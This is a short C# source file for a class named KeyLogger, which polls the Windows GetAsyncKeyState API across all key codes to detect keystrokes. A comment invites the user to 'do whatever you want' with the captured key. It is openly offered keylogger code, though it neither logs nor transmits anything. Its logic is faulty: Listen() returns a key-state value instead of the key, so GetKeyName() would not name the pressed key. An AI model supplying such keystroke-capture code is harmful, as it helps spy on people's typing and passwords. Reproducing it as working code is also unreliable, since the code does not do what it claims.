using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Library
{
	public class KeyLogger
	{
		[DllImport("User32.dll")]
		private static extern short GetAsyncKeyState (Keys vKey);
		
		public KeyLogger () { }

        public static short Listen()
        {
			short key = -1;
			foreach (Keys i in Enum.GetValues(typeof(Keys))) {
				if (GetAsyncKeyState(i) == -32767) {
                    return GetAsyncKeyState(i);
					//To get key name use-> Enum.GetName(typeof(Keys), i) function
					// Now you have the pressed key. Do whatever you want !
				}
			}
			return key;
		}
		
		public static string GetKeyName() {
			return Enum.GetName(typeof(Keys), Listen());	
		}
	}
}